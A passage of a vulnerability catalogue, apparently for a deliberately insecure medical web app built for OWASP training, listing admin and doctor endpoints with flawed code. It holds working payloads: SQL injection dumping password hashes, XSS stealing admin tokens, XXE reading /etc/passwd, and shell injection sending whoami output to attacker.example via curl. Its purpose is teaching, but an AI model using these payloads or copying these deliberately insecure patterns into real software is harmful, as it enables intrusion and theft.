if (q      != null && !q.isBlank())     sql.append(" AND (details LIKE '%").append(q).append("%' OR user_agent LIKE '%").append(q).append("%')");
```
Caller controls `q`, `action`, `from`, `to` — all concatenated directly into a `createNativeQuery` invocation. Demo payload:
```
GET /api/admin/logs?q=' UNION SELECT id,username,email,password_hash,'','','','',NOW() FROM users--
```
Returns every password hash through the audit-log surface. The frontend search box (`AdminLogsPage` — "Search details / userAgent…") sends `q` verbatim.

---

**159. [A01][A10] GET /admin/logs/{id} returns raw stack trace — `AdminAuditController.java`, `AdminAuditService.java#findById`**
```java
return ResponseEntity.ok(adminAuditService.findById(id));
```
`AuditLog.details` is the column where `LoggingInterceptor` writes `ex.printStackTrace(pw)`. The detail endpoint returns it unfiltered. Combined with the UI rendering it via `dangerouslySetInnerHTML` (#161), the framework version + internal package layout + DB table names that appear in the trace are both **disclosed** and **executable** as XSS when an admin opens the entry.

---

**160. [A09] DELETE /admin/logs/{id} — selective audit tampering — `AdminAuditController.java`, `AdminAuditService.java#deleteOne`**
```java
@DeleteMapping("/{id}")
public ResponseEntity<Map<String, Object>> delete(@PathVariable Long id) {
    return ResponseEntity.ok(adminAuditService.deleteOne(id));
}
```
The existing `POST /logs/clear` (#65) is a wipe-everything sledgehammer. The new per-id delete is the **scalpel**: an attacker can remove the single audit row that recorded their privileged action, leaving the rest of the timeline intact and the operation effectively invisible to log review.

---

**161. [A03] Audit log detail rendered via `dangerouslySetInnerHTML` — `AdminLogDetailPage.tsx` (frontend)**
```tsx
<div
  className="mt-3 rounded-[3px] border ... font-mono whitespace-pre-wrap break-words ..."
  dangerouslySetInnerHTML={{ __html: data.details ?? '<em>(empty)</em>' }}
/>
```
Whatever is in `audit_logs.details` executes in the admin's session. Several user-controlled fields already feed this column via `LoggingInterceptor` — `User-Agent`, request bodies, query strings. Attack: send a request with `User-Agent: <img src=x onerror=fetch('/api/admin/users/1/impersonate',{method:'POST'}).then(r=>r.json()).then(d=>localStorage.token=d.token)>`, then wait for an admin to open the corresponding log entry. The XSS runs with the admin's token.

---

**162. [A03] CSV / XML export built by string concatenation with no escaping — `AdminAuditService.java#exportLogs` / `toXmlElement`**
```java
sb.append(l.getId()).append(',').append(csv(l.getAction())).append(',') ... .append(csv(l.getDetails())).append('\n');
// csv() just wraps in quotes — doesn't escape embedded quotes/newlines
private String csv(String s) { return "\"" + s.replace("\n", "\\n") + "\""; }
```
Three flaws ride on the same code path:
- **CSV injection**: a `details` field starting with `=` becomes a formula when the export is opened in Excel — `details = "=HYPERLINK('http://evil/?'&A1,'open')"` exfiltrates the row.
- **CSV malformation**: an embedded `"` breaks the cell boundaries and pulls subsequent rows into one cell — silent data corruption.
- **XML injection**: `toXmlElement` concatenates `details` and `userAgent` directly into `<details>…</details>` and `<userAgent>…</userAgent>`. An attacker-controlled `User-Agent` containing `</userAgent><script>…</script>` breaks the XML and lets the attacker re-shape the export structure for downstream tooling.

---

**163. [A03] XXE-vulnerable DocumentBuilderFactory — `AdminAuditService.java#renderXmlWithTemplate`**
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
// factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); // disabled
// factory.setFeature("http://xml.org/sax/features/external-general-entities", false); // disabled
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new ByteArrayInputStream(xmlPayload.getBytes(StandardCharsets.UTF_8)));
```
Helper reserved for a future POST `/logs/import` endpoint, but already on the surface. Classic XXE — submitting a payload like:
```xml
<!DOCTYPE r [ <!ENTITY e SYSTEM "file:///etc/passwd"> ]>
<r>&e;</r>
```
returns the file's contents in the response body. SSRF variant `<!ENTITY e SYSTEM "http://169.254.169.254/...">` exfiltrates cloud metadata. Commented-out hardening features are kept in source as a teaching artifact — the safe defaults are right there, just disabled.

---

**164. [A03] XML export download — UI flags it but lets it proceed — `AdminLogsPage.tsx#downloadExport` (frontend)**
```tsx
if (format === 'xml') {
  toast('[A03] XML export — entity escaping is off; payloads in details/userAgent ride along', 'warning')
}
```
The toast names the vulnerability but the export still downloads. Two impact paths:
- The exported file dropped onto downstream tooling (SIEM, log analyzer) carries the unsanitized XML payloads through.
- The admin browsing the file locally in a browser tab gets the same DOM XSS as the detail page (#161).

---

## Admin View Redesign — Module C (System & Ops)

> Backend: new `AdminOpsController` + `AdminOpsService`, new `AdminDashboardDto`. Replaces the now-deleted `AdminController` / `AdminService` (both retired after their `/config` moved here and `/logs*` moved to AdminAuditController). UI: full `AdminDashboardPage` (with refill widget preserved), `AdminOpsPage` with Config / Health / Maintenance sub-tabs.

### New Files

| File | Description |
|---|---|
| `controller/AdminOpsController.java` | `/api/admin/dashboard`, `/health`, `/config` (moved from old AdminController), `PUT /config/{key}`, `/maintenance/run-sql`, `/maintenance/restart`, `/maintenance/backup` |
| `service/AdminOpsService.java` | Dashboard counts via native SQL; JVM/DB health probe; runtime config override; arbitrary SQL executor; `System.exit(0)` restart; mysqldump-via-shell backup |
| `dto/AdminDashboardDto.java` | Aggregate counts + recent events payload |
| **Frontend** `pages/admin/AdminDashboardPage.tsx` | Stat cards, count breakdowns, refill-queue widget (migrated from AdminPage; preserves `failureReason` XSS sink #143), recent events feed |
| **Frontend** `pages/admin/AdminOpsPage.tsx` | Config tab with click-to-override flow, Health tab (5s refresh), Maintenance tab with RunSqlConsole / Backup / Restart |
| **Frontend** `api/admin.ts#opsApi` | Typed wrappers; `backupUrl(dbName)` constructs query string raw (so dbName payloads ride through) |
| **Deleted** `controller/AdminController.java`, `service/AdminService.java` | All endpoints migrated; both files removed |

### Vulnerabilities

**165. [A03] SQL injection via dashboard `since` parameter — `AdminOpsService.java#getDashboard`**
```java
String failedLoginsSql = "SELECT COUNT(*) FROM users WHERE failed_login_attempts > 0";
if (since != null && !since.isBlank()) {
    failedLoginsSql += " AND created_at >= '" + since + "'";
}
long failedLogins = ((Number) entityManager.createNativeQuery(failedLoginsSql).getSingleResult()).longValue();
```
The dashboard's "failed logins last 24h" counter splices `since` into the WHERE clause. Demo payload: `?since=2026-01-01' UNION SELECT password_hash FROM users WHERE '1'='1` — the count column is repurposed to exfiltrate password hashes one at a time.

---

**166. [A02] /api/admin/health dumps JVM internals — `AdminOpsService.java#getHealth`**
```java
health.put("classPath",  System.getProperty("java.class.path"));
health.put("javaHome",   System.getProperty("java.home"));
health.put("user.dir",   System.getProperty("user.dir"));
health.put("memoryMaxMb",      rt.maxMemory() / (1024 * 1024));
```
Returns the full JVM classpath (every jar with full filesystem path), `JAVA_HOME`, the working directory, memory layout, and DB latency via a `SELECT 1` round-trip. Each piece is independently useful for an attacker: classpath confirms framework versions, working directory identifies the deployment shape, latency confirms DB reachability. UI refreshes the panel every 5 s without any throttle.

---

**167. [A02][A09] Runtime config override via `PUT /api/admin/config/{key}` — `AdminOpsService.java#setConfig`**
```java
sources.addFirst(new MapPropertySource("admin-runtime-overrides", overrides));
```
Caller writes any key/value into a new `MapPropertySource` added at the top of Spring's property source list. Subsequent `Environment.getProperty(key)` reads pick up the override. Two impacts:
- **A02**: any code path that resolves config at request time observes the override (e.g., the `AdminOpsController.getConfig` dump now shows the attacker-supplied value).
- **A09**: future logging/audit hooks that read config dynamically (`environment.getProperty("audit.enabled")` style) can be muted at runtime.

**Known limitation**: Spring Boot's `LoggingApplicationListener` binds `logging.level.*` at startup, and `@Value`-injected fields are also bound once. The override is therefore visible to dynamic lookups but doesn't retroactively change already-bound config — the demo lands as "admin can write into the live Spring environment at runtime" but the chain "disable the existing LoggingInterceptor via this endpoint" doesn't actually mute it. Real damage requires consumers that re-read at request time.

---

**168. [A03] Arbitrary SQL execution via `POST /api/admin/maintenance/run-sql` — `AdminOpsService.java#runSql`**
```java
Query q = entityManager.createNativeQuery(sql);
int affected = entityManager.createNativeQuery(sql).executeUpdate();
```
Caller passes a raw SQL string. Service routes by leading verb: `SELECT/SHOW/DESCRIBE` go through `getResultList`, everything else through `executeUpdate`. Equivalent to RCE-on-database: drop tables, exfiltrate any column, create new ADMIN users (`INSERT INTO users ...`), forge audit entries, etc. The UI's RunSqlConsole renders result cells with `dangerouslySetInnerHTML` (#170 below) — a `SELECT '<script>fetch(...)' ` query becomes immediate XSS in the admin's session.

---

**169. [A04] `POST /api/admin/maintenance/restart` calls `System.exit(0)` — `AdminOpsService.java#restart`**
```java
new Thread(() -> {
    try { Thread.sleep(500); } catch (InterruptedException ignored) {}
    System.exit(0);
}, "admin-restart").start();
```
No role check, no rate limit. A PATIENT can repeatedly call the endpoint to keep the JVM in a restart loop — availability attack on the entire backend. The 500 ms delay exists only so the HTTP response can flush before the JVM dies; it doesn't reduce blast radius.

---

**170. [A03] Command injection via `GET /api/admin/maintenance/backup?dbName=…` — `AdminOpsService.java#backup`**
```java
ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", "mysqldump --no-create-db " + dbName);
```
Caller-controlled `dbName` is concatenated into a shell command passed to `sh -c`. The `mysqldump` binary may or may not exist in the container; either way the shell still runs whatever the attacker appends. Demo payloads:
- `?dbName=mediconnect_db;id` — appends `id` after the dump (or its failure)
- `?dbName=$(curl%20attacker.example/$(whoami))` — exfiltrates the result of `whoami` to an attacker-controlled HTTP endpoint
- `?dbName=mediconnect_db;cat%20/etc/passwd` — file disclosure

stdout + stderr are both returned to the caller in the response body via `redirectErrorStream(true)`.

---

**171. [A03] Run-SQL Console renders result cells with `dangerouslySetInnerHTML` — `AdminOpsPage.tsx` (frontend)**
```tsx
<td
  key={j}
  className="px-2 py-1 align-top text-[#E6EDF3]"
  /* [A03] Cell rendered as HTML — SELECT '<script>...' executes */
  dangerouslySetInnerHTML={{ __html: cell == null ? '<em class="text-[#484F58]">NULL</em>' : String(cell) }}
/>
```
Every result-row cell from the Run-SQL endpoint is rendered as HTML. Stored-XSS pivot: an attacker who can land payloads in any database column (audit_logs.details via User-Agent, messages.content via the existing XSS sink, etc.) waits for an admin to run a SELECT touching that column and the payload executes in the admin's session. Pairs with vuln #170's command injection — a backup output blob could be selected via a follow-up query if the dump is loaded back into the DB.

---

**172. [A04] System Config dialog highlights but does not redact secrets — `AdminOpsPage.tsx` (frontend)**
```tsx
const isSecret = k.toLowerCase().includes('password') || k.toLowerCase().includes('secret') || k.toLowerCase().includes('token')
<span className={`col-span-7 font-mono ... ${isSecret ? 'text-[#F85149] font-semibold' : 'text-[#E6EDF3]'}`}>
  {String(v ?? '')}
</span>
```
Continues the existing #122 pattern: keys containing `password`/`secret`/`token` get a red-highlight to *flag* sensitive values — and then renders the plaintext anyway. Reads like a security feature, behaves like an info-disclosure tool. The same row, when clicked, opens the runtime override editor (#167) so the admin (or any caller, since `permitAll`) can mutate it.

---

## Admin View Redesign — Module E (Clinical Overrides)

> Backend: new `AdminClinicalController` + `AdminClinicalService` and migration V18. UI: `pages/admin/AdminOverridesPage.tsx` with four tabs (Prescriptions / Refills / Records / Labs). Backed by `clinicalApi` in `api/admin.ts`.

### New Files

| File | Description |
|---|---|
| `controller/AdminClinicalController.java` | `/api/admin/prescriptions`, `/refills`, `/medical-records`, `/lab-results` — list + override endpoints |
| `service/AdminClinicalService.java` | Force-dispense, mass-assign prescription, override refill, delete record, override lab value |
| `V18__cascade_clinical_fks.sql` | `prescriptions.medical_record_id` and `refill_requests.prescription_id` → `ON DELETE CASCADE` so DELETE actually succeeds |
| **Frontend** `pages/admin/AdminOverridesPage.tsx` | 4-tab page replacing the stub; each tab is a separate OWASP demo |
| **Frontend** `api/admin.ts#clinicalApi` | Typed wrappers for all Module E endpoints |

### Vulnerabilities

**173. [A01] POST /admin/prescriptions/{id}/force-dispense bypasses pharmacist workflow — `AdminClinicalService.java#forceDispense`**
```java
public Map<String, Object> forceDispense(Long id) {
    Prescription rx = prescriptionRepository.findById(id).orElseThrow(...);
    rx.setStatus(PrescriptionStatus.DISPENSED);
    rx.setDispensedAt(LocalDateTime.now());
    return toPrescriptionMap(prescriptionRepository.save(rx));
}
```
The existing dispense path (`PrescriptionService.dispense`, vulns #108/#109) at least requires a `pharmacistId` in the body — which the audit log captures. Force-dispense skips that entirely. Result: `pharmacist_id` stays at whatever it was (often `NULL` on freshly-created prescriptions), the audit trail has no actor, and no `EligibilityValidator` call is made → allergy / contraindication checks bypassed. A PATIENT can force-dispense their own prescription before a pharmacist has even seen it.

---

**174. [A07] PUT /admin/prescriptions/{id} mass-assigns patientId — `AdminClinicalService.java#updatePrescription`**
```java
if (body.containsKey("patientId")) {
    Long newPatientId = ((Number) body.get("patientId")).longValue();
    Patient patient = patientRepository.findById(newPatientId).orElseThrow(...);
    rx.setPatient(patient);
}
if (body.containsKey("dispensedAt")) {
    Object v = body.get("dispensedAt");
    rx.setDispensedAt(v == null ? null : LocalDateTime.parse(v.toString()));
}
```
Caller can re-target an existing prescription to any other patient, falsify `dispensedAt`, and change `status` arbitrarily. Two compound attacks:
- **Medication-history forgery**: take a DISPENSED prescription from patient2 (Atorvastatin) and re-attribute it to patient3 by changing `patientId`. Patient3's medication history now shows a drug they never received — potential medico-legal weapon.
- **Time-of-dispense fraud**: set `dispensedAt` to last month to fake compliance with a past medication regimen.

---

**175. [A01] POST /admin/refills/{id}/override skips queue + validator — `AdminClinicalService.java#overrideRefill`**
```java
refill.setStatus(RefillStatus.valueOf(targetStatus));
refill.setFailureReason(null);
if (body.containsKey("quantity")) {
    Object q = body.get("quantity");
    refill.setQuantity(q == null ? null : ((Number) q).intValue());
}
```
Compounds the existing async refill queue A10 chain (#128-#144). A refill that the `EligibilityValidator` marked FAILED can be promoted directly to READY here, bypassing the validator entirely. The UI exposes three one-click buttons per row: `READY`, `DISPENSED`, `FAILED`. Combined with the existing `POST /api/refills/{id}/dispense` (which has no role check — #128), a PATIENT can chain: override→READY → dispense via the existing endpoint → opioid prescription in their hand with no pharmacist involvement.

---

**176. [A09] DELETE /admin/medical-records/{id} hard-deletes clinical history — `AdminClinicalService.java#deleteMedicalRecord`, `V18__cascade_clinical_fks.sql`**
```java
public Map<String, Object> deleteMedicalRecord(Long id) {
    medicalRecordRepository.deleteById(id);
    return Map.of("deleted", true, "id", id);
}
```
```sql
-- V18 required so the delete succeeds instead of throwing FK constraint:
ALTER TABLE prescriptions   ADD CONSTRAINT fk_rx_record         FOREIGN KEY (medical_record_id) REFERENCES medical_records(id) ON DELETE CASCADE;
ALTER TABLE refill_requests ADD CONSTRAINT fk_refill_prescription FOREIGN KEY (prescription_id) REFERENCES prescriptions(id)   ON DELETE CASCADE;
```
No retention policy, no archival, no audit beyond the interceptor's HTTP-call entry (which #160 can selectively delete after the fact). Cascade in V18 also wipes every prescription that referenced the record and every refill_request on those prescriptions — one DELETE removes an entire patient encounter. HIPAA / GDPR require medical records be retained for years; this endpoint reads "DELETE FROM" against that obligation.

---

**177. [A08] POST /admin/lab-results/{id}/override-value mutates without amend flag — `AdminClinicalService.java#overrideLabResultValue`**
```java
if (body.containsKey("resultValue"))    lab.setResultValue(String.valueOf(body.get("resultValue")));
if (body.containsKey("referenceRange")) lab.setReferenceRange((String) body.get("referenceRange"));
// [A08] Deliberately NOT changing labTech (the original tech still owns
//        the amended record) and NOT touching testDate. The result reads
//        as authoritative.
```
Mutates the numeric `resultValue` and `referenceRange` of a lab result. **No `amended` column exists** on the entity, no `original_value` is preserved, `testDate` is not touched, `labTech` keeps pointing at whoever certified the original. Clinicians opening the record see the falsified result as if the lab tech had always entered it that way. The audit log records the HTTP call but the request body that contains the *new* value is stored — the *original* value is lost. UI deliberately omits an "amended" badge in `AdminOverridesPage.tsx` LabsTab so the demo's invisibility is intact.

---

**178. [A01]/[A07]/[A09] AdminOverridesPage exposes every action with one click — `AdminOverridesPage.tsx` (frontend)**
```tsx
{(['READY', 'DISPENSED', 'FAILED'] as const).map((s) => (
  <button onClick={() => overrideMutation.mutate({ id: r.id, status: s })}>{s}</button>
))}
<Button variant="destructive" onClick={() => { if (confirm(...)) deleteMutation.mutate(r.id) }}>
```
Each tab places its privileged actions inline with the table. Refill overrides are one click per status with no confirm. Medical-record delete has only a `confirm()` JS dialog (trivially bypassable in DevTools by disabling `window.confirm`). Lab edits open a dialog with raw inputs and no diff-against-original preview. Compound: a PATIENT who lands on `/admin/overrides` directly can chain `force-dispense → override-refill → override-lab` to manufacture a complete falsified treatment history in seconds.

---

## Admin View Redesign — Module B (Clinical Staff Onboarding)

> Backend: new `AdminStaffController` + `AdminStaffService` and migration V19 (adds `doctors.license_verified` + `license_document_path`). UI: full `AdminOnboardingPage` (replacing the Phase 0 stub) with `staffApi` in `api/admin.ts`.

### New Files

| File | Description |
|---|---|
| `controller/AdminStaffController.java` | `GET /admin/doctors`, `PUT /admin/doctors/{id}`, `POST /admin/doctors/{id}/verify-license`, `POST /admin/staff/onboard` (multipart) |
| `service/AdminStaffService.java` | License flip (trust client), doctor mass-assign, onboarding (User + role profile + path-traversal upload) |
| `V19__doctor_license_verification.sql` | Adds `license_verified BOOLEAN` and `license_document_path VARCHAR(500)` to `doctors` |
| `entity/Doctor.java` (modified) | Two new fields wired to the V19 columns |
| **Frontend** `pages/admin/AdminOnboardingPage.tsx` | Wizard form (User fields + role-specific section), file upload field, doctor list with one-click Verify |
| **Frontend** `api/admin.ts#staffApi` | Typed wrappers; `onboard()` builds a FormData and lets axios set the Content-Type boundary |

### Vulnerabilities

**179. [A04] POST /admin/doctors/{id}/verify-license trusts client claim — `AdminStaffService.java#verifyLicense`**
```java
if (body.containsKey("licenseNumber")) {
    doctor.setLicenseNumber((String) body.get("licenseNumber"));
}
boolean verified = body.containsKey("verified") ? Boolean.TRUE.equals(body.get("verified")) : true;
doctor.setLicenseVerified(verified);
```
"Verification" is the client telling the server `verified=true`. No call to any external licensing registry, no document inspection, no signed attestation. Same call can simultaneously rewrite the `licenseNumber` — attacker sets any number they like and immediately marks it valid. The UI's one-click "Verify" button (`AdminOnboardingPage.tsx`) wraps this in two clicks (open page → click) for any caller who can hit `/admin/*`.

---

**180. [A07] PUT /admin/doctors/{id} mass-assigns every doctor field — `AdminStaffService.java#updateDoctor`**
```java
if (body.containsKey("specialty"))       doctor.setSpecialty(...);
if (body.containsKey("licenseNumber"))   doctor.setLicenseNumber(...);
if (body.containsKey("hospital"))        doctor.setHospital(...);
if (body.containsKey("licenseVerified")) doctor.setLicenseVerified(Boolean.TRUE.equals(body.get("licenseVerified")));
```
Patches every doctor column from the body, including `licenseVerified` so the caller can both un-verify a real doctor and re-verify a fake one in the same call. Combined with #174 (admin can re-target a prescription's `patientId`) and #177 (lab value override), an attacker can construct an end-to-end forged clinical record: fake doctor → fake prescription pointing at the victim patient → fake lab value supporting the diagnosis.

---

**181. [A05] POST /admin/staff/onboard path traversal via license document upload — `AdminStaffService.java#onboardStaff`**
```java
String filename = licenseDocument.getOriginalFilename();
String storagePath = uploadDir + filename;
Path destination = Paths.get(storagePath);
Files.createDirectories(destination.getParent());
Files.copy(licenseDocument.getInputStream(), destination, StandardCopyOption.REPLACE_EXISTING);
```
Same pattern as the existing `MedicalRecordService.uploadAttachment` sink (#11 family). `getOriginalFilename()` is attacker-controlled and concatenated directly into `uploadDir`. Demo payload (multipart filename header):
```
Content-Disposition: form-data; name="licenseDocument"; filename="../../../tmp/shell.jsp"
```
Lands `shell.jsp` outside the upload directory. `REPLACE_EXISTING` means the attacker can overwrite arbitrary files if the traversal lands on a writable target.

---

**182. [A07] POST /admin/staff/onboard creates any role from form data — `AdminStaffService.java#onboardStaff`**
```java
String roleStr = fields.getOrDefault("role", "PATIENT");
Role role = Role.valueOf(roleStr);
User user = User.builder()
    .role(role)
    // [A06] MD5(password) — no salt
    .passwordHash(passwordUtils.hashPassword(fields.getOrDefault("password", "changeme")))
    ...
```
Multipart form data accepts `role` verbatim — including ADMIN. Combined with the unauthenticated `permitAll` on `/api/admin/**`, this is a **second** unauthenticated ADMIN-account-creation surface (the first being `POST /admin/users`, #63). Wrapped in a wizard UI on `AdminOnboardingPage`, so an attacker who navigates there directly fills the form, selects "ADMIN" from the role dropdown, and submits.

---

**183. [A05] Uploaded filename rendered as HTML on the onboarding result panel — `AdminOnboardingPage.tsx` (frontend)**
```tsx
<span
  className="text-[#F85149]"
  dangerouslySetInnerHTML={{ __html: lastResult.uploadedFilename }}
/>
```
After a successful upload, the result panel echoes the original filename via `dangerouslySetInnerHTML`. A filename like `<img src=x onerror=fetch('/api/admin/users/1/impersonate',{method:'POST'}).then(r=>r.json()).then(d=>localStorage.token=d.token)>` becomes immediate XSS in the admin's session. Pairs with #181: the path traversal lands the file on disk **and** the filename payload executes in the browser.

---

**184. [A04] Doctor entity carries `licenseVerified` + `licenseDocumentPath` with no audit trail — `Doctor.java`, `V19__doctor_license_verification.sql`**
```java
@Column(name = "license_verified")
private Boolean licenseVerified;

@Column(name = "license_document_path", length = 500)
private String licenseDocumentPath;
```
The verification timestamp, the verifier, and the previous value of `licenseVerified` are all missing. Flipping the flag back-and-forth leaves no record of when or by whom — `LoggingInterceptor` captures the HTTP call but a follow-up `DELETE /admin/logs/{id}` (#160) removes that. Plus `licenseDocumentPath` is stored verbatim; if traversal succeeded the path field publicly advertises the attacker-controlled location for future reference.

---

## Admin View Redesign — Module F (Broadcast)

> Backend: new `AdminBroadcastController` + `AdminBroadcastService`. No new entities — broadcasts ride the existing `messages` table. UI: full `AdminBroadcastPage` (composer + recipients preview + history with redact). Backed by `broadcastApi` in `api/admin.ts`.

### New Files

| File | Description |
|---|---|
| `controller/AdminBroadcastController.java` | `POST /admin/broadcast`, `GET /admin/broadcast/history`, `POST /admin/broadcast/preview`, `POST /admin/messages/{id}/redact` |
| `service/AdminBroadcastService.java` | Fan-out send, recipient preview, in-place redact |
| **Frontend** `pages/admin/AdminBroadcastPage.tsx` | Composer (Subject + HTML textarea + Sender ID + role multi-select), live HTML preview, recipients list, history table with Redact buttons |
| **Frontend** `api/admin.ts#broadcastApi` | Typed wrappers for all Module F endpoints |

### Vulnerabilities

**185. [A05] POST /admin/broadcast stores raw HTML into Message.content — `AdminBroadcastService.java#broadcast`**
```java
// [A05] subject + html stored verbatim
String body_ = "<h3>" + subject + "</h3>" + html;
for (User recipient : recipients) {
    Message m = Message.builder()
            .sender(sender != null ? sender : recipient)
            .receiver(recipient)
            .content(body_)
            .sentAt(LocalDateTime.now())
            .build();
    messageRepository.save(m);
}
```
The recipient sink already exists at `MessagesPage.tsx:293` (vuln #84) — message content is rendered via `dangerouslySetInnerHTML` in every patient/doctor inbox. So a broadcast that writes raw HTML into `Message.content` is stored XSS for every account that matches the role filter. Demo payload:
```json
POST /api/admin/broadcast
{"subject": "Maintenance", "html": "<img src=x onerror=fetch('/api/admin/users/1/impersonate',{method:'POST'}).then(r=>r.json()).then(d=>localStorage.token=d.token)>", "roles": ["PATIENT", "DOCTOR"]}
```
Every PATIENT and DOCTOR who opens their inbox now has the admin's impersonation token in `localStorage`.

---

**186. [A07] Broadcast `senderId` taken from request body — `AdminBroadcastService.java#broadcast`**
```java
Long senderId = body.get("senderId") instanceof Number
        ? ((Number) body.get("senderId")).longValue()
        : 1L;
User sender = userRepository.findById(senderId).orElse(null);
```
Compounds the existing `Message.senderId` spoofing surface (#88, #117). The broadcast lands in every recipient inbox attributed to whichever user the attacker named — `doctor1`, `pharmacist1`, the patient's own doctor. The recipient sees a trusted name above the XSS payload, increasing the chance they click through. JWT identity is never consulted.

---

**187. [A04] Broadcast fan-out unbounded — `AdminBroadcastService.java#broadcast`**
```java
recipients = userRepository.findAll();
// ... loop creates one Message per user, synchronously, no upper limit
```
Empty role list = "send to all roles" (the UI default). With the seeded 9 accounts this is trivial; on a deployment with N users the endpoint blocks the request thread for N inserts. Pair with #169 (`/maintenance/restart`) for a comedy availability attack — broadcast 10k spam rows, then trigger a restart so the writes flush during shutdown.

---

**188. [A08][A09] POST /admin/messages/{id}/redact overwrites content in place — `AdminBroadcastService.java#redact`**
```java
String replacement = body != null && body.get("content") instanceof String
        ? (String) body.get("content")
        : "<em>[redacted]</em>";
m.setContent(replacement);
messageRepository.save(m);
```
No `redacted_at` column, no `redacted_by`, no `original_content`. The only record of what the message used to say lived in the response body of the original send call — `ContentCachingFilter` may have captured it into `audit_logs.details`, but `DELETE /admin/logs/{id}` (#160) and `POST /admin/logs/clear` (#65) both reach that. After a redact + a log delete the message's prior content is gone from the system. UI exposes one-click Redact buttons next to each broadcast in the history table; no confirmation, no diff preview.

---

**189. [A05] Broadcast preview pane renders the draft via `dangerouslySetInnerHTML` — `AdminBroadcastPage.tsx` (frontend)**
```tsx
<div
  className="rounded-[3px] border ... p-3 text-[#E6EDF3] min-h-[120px]"
  /* [A03] Preview rendered as HTML — same sink as recipient inbox */
  dangerouslySetInnerHTML={{ __html: wrappedBody }}
/>
```
Self-inflicted XSS: an admin testing their own broadcast payload triggers it locally before sending. Useful as a teaching artifact — the same sink is in both the composer preview and the recipient inbox, so the demo can be reproduced without leaving the admin page. The `subject` field is concatenated into an `<h3>` tag with no escaping (`wrappedBody = "<h3>${subject}</h3>${html}"`), so even the subject is an injection vector.

---

**190. [A04] Send-to-all default + Send button label updates dynamically — `AdminBroadcastPage.tsx` (frontend)**
```tsx
const [selectedRoles, setSelectedRoles] = useState<string[]>([])  // empty == "ALL ROLES"
<Button onClick={() => sendMutation.mutate()} disabled={sendMutation.isPending}>
  Send to {recipientCount} recipient{recipientCount === 1 ? '' : 's'}
</Button>
```
Initial state is `[]` (no role filter), which the backend interprets as "send to all roles" (vuln #187). The button label dynamically shows the recipient count — but there's no `confirm()` dialog and no second-step approval before fanning out. One click after pasting a payload sends it to every account in the system.

---

## Doctor View Redesign — Phase 0 (Shell)

> Backend: seven empty controllers wired to `permitAll()` ahead of Modules A–F. UI: new `DoctorRoute` + `DoctorLayout` + `DoctorSidebar` + 8 stub pages under `/doctor/*`. The shared `Sidebar.tsx` now hides patient nav items for `role === 'DOCTOR'` (same pattern already used for ADMIN), and the `DoctorDashboard` subcomponent has been removed from `StaffDashboardPage.tsx` — `/staff` remains the LAB_TECH + PHARMACIST landing only. Three deps added to `pom.xml` (Freemarker, OpenPDF, Nashorn) so Phases 2/4 can land their sinks without pom churn later.

### New Files

| File | Description |
|---|---|
| `controller/DoctorRosterController.java` | Module A endpoints — placeholder bodies |
| `controller/DoctorNoteController.java` | Module B endpoints — placeholder bodies |
| `controller/DoctorLabController.java` | Module C endpoints — placeholder bodies |
| `controller/DoctorPrescribingController.java` | Module D endpoints — placeholder bodies |
| `controller/DoctorSessionController.java` | Module E endpoints — placeholder bodies |
| `controller/DoctorAIController.java` | Module F (AI half) — placeholder bodies |
| `controller/DoctorReferralController.java` | Module F (Referral half) — placeholder bodies |
| **Frontend** `auth/DoctorRoute.tsx` | Mirrors `AdminRoute.tsx`; deliberately omits `requiredRole` |
| **Frontend** `components/doctor/DoctorLayout.tsx` | Doctor shell — green accent (`#3FB950`) to distinguish from admin red |
| **Frontend** `components/doctor/DoctorSidebar.tsx` | 8 nav items (Dashboard, My Patients, Notes, Lab & Imaging, Prescribe, Telemedicine, AI Assist, Referrals) — each tagged with the OWASP category arriving in its module |
| **Frontend** `pages/doctor/*` | 8 placeholder pages — each names its target phase + OWASP demo |
| **Frontend** `api/doctor.ts` | Typed wrappers for the new endpoints |
| `pom.xml` (edited) | `org.freemarker:freemarker:2.3.34`, `com.github.librepdf:openpdf:2.0.3`, `org.openjdk.nashorn:nashorn-core:15.6` |
| `App.tsx` (edited) | Adds 9 `/doctor/*` routes under `<DoctorRoute>` |
| `components/layout/Sidebar.tsx` (edited) | `dashboardPath` resolves `DOCTOR → /doctor`; filter now hides patient items for DOCTOR (same shape as the existing ADMIN branch) |
| `pages/StaffDashboardPage.tsx` (edited) | `DoctorDashboard` subcomponent + `role === 'DOCTOR'` branch removed; LAB_TECH + PHARMACIST untouched |

### Vulnerabilities

**191. [A01] All seven `/api/doctor/**` controllers wired under `SecurityConfig.permitAll()` — `controller/Doctor*Controller.java`**
```java
@RestController
@RequestMapping("/api/doctor")
public class DoctorRosterController { ... }
```
`SecurityConfig.java` line 66 has `.anyRequest().permitAll()` — every new `/api/doctor/**` route is reachable by anonymous callers as soon as it ships. No `@PreAuthorize`, no role check, no JWT validation requirement. Mirrors the existing `/api/admin/**` weakness. Phase 0 establishes the surface; Modules A–F land their concrete sinks (SSRF, deserialisation, SSTI, etc.) on routes already wired open.

---

**192. [A01] `DoctorRoute.tsx` ships without `requiredRole` — `auth/DoctorRoute.tsx` (frontend)**
```tsx
export function DoctorRoute({ children }: { children: ReactNode }) {
  const { isAuthenticated, token } = useAuth()
  if (!isAuthenticated || !token) return <Navigate to="/login" replace />
  return <>{children}</>
}
```
`ProtectedRoute.tsx` already supports `requiredRole` — using it would *fix* the demo. Mirroring `AdminRoute.tsx`, the new wrapper exists for routing organisation only: any authenticated user (PATIENT, LAB_TECH, PHARMACIST, ADMIN) can navigate to `/doctor/*` and see the full Doctor Console. Editing `localStorage.user.role` flips the dashboard target without any server check (compounds with #76 / #77).

---

**193. [A06] `Sidebar.tsx` `dashboardPath` mapping is client-decoded role-based routing — `components/layout/Sidebar.tsx` (frontend)**
```tsx
const dashboardPath = user?.role === 'PATIENT' ? '/dashboard'
  : user?.role === 'ADMIN' ? '/admin'
  : user?.role === 'DOCTOR' ? '/doctor'
  : '/staff'
```
Role pulled from `localStorage`-decoded JWT payload (no signature check — see #77). A PATIENT who edits `user.role` to `DOCTOR` in DevTools is redirected to `/doctor` and inherits the Doctor Console UI, including all Module-A–F privileged calls. Backend has no role check on `/api/doctor/**` (vuln #191), so the spoof works end-to-end. Extends the existing pattern (`#103` for the original PATIENT/ADMIN/STAFF mapping).

---

### Phase 0 Bug-Check Pass (per `DOCTOR_VIEW_PLAN.md` §7.1)

